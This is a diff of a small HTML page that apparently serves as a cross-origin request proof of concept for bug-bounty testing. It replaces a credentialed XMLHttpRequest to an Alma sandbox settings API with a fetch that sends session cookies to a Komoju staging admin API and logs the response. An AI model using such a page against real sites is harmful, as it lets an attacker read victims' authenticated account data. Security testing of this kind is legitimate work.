@@ -1,14 +1,23 @@
-<html>
-  <body>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
     <script>
-      function submitRequest(){
-      
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://api.sandbox.getalma.eu/v1/settings/api", true);
-        xhr.withCredentials = true;
-        xhr.send(null)
-	  }
-      submitRequest();
+
+        fetch('https://yeswehack.staging.komoju.com/admin/api/v1/banners', {
+            method: 'GET',
+            credentials: 'include' // Jika perlu mengirim cookie sesi
+        })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error:', error));
     </script>
-  </body>
+</body>
+
 </html>
